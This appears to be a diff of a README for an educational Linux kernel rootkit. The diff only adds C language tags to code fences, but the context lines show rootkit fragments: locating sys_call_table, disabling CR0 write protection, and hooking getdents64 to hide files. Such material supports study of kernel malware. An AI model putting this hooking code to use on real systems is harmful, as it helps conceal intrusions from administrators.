@@ -55,7 +55,7 @@ Hooking is the act of redirecting/modifying a certain code stream, this redirect
 
 - The ``find_syscall_table`` function uses the kprobes module to find the address of the kernel syscall table (sys_call_table).
 
-```
+```c
 unsigned long *find_syscall_table(void)
 {
     typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
@@ -74,7 +74,7 @@ unsigned long *find_syscall_table(void)
 
 - The ``unprotect_memory`` function disables write protection on the page containing the syscall table, allowing the rootkit to modify the syscall table.
 
-```
+```c
 static inline void unprotect_memory(void)
 {
     write_cr0_forced(cr0 & ~0x00010000);
@@ -85,7 +85,7 @@ static inline void unprotect_memory(void)
 
 - In ghost_init, the address of the original getdents64 syscall is saved and replaced with the address of the hook function (hook_getdents64).
 
-```
+```c
 static int __init ghost_init(void)
 {
     __syscall_table = find_syscall_table();
@@ -109,7 +109,7 @@ static int __init ghost_init(void)
 
 After replacement, write protection is restored.
 
-```
+```c
 static inline void protect_memory(void)
 {
     write_cr0_forced(cr0);
@@ -120,7 +120,7 @@ static inline void protect_memory(void)
 
 - The hook function hook_getdents64 intercepts calls to getdents64, checks file names, and hides any file named file_to_hide. 
 
-```
+```c
 asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
     int ret = orig_getdents64(fd, dirp, count);
     struct linux_dirent64 *d, *kd, *kdirent = NULL;
@@ -158,7 +158,7 @@ asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, uns
 
 - When unloading the module, the original syscall is restored:
 
-```
+```c
 static void __exit ghost_exit(void)
 {
     unprotect_memory();
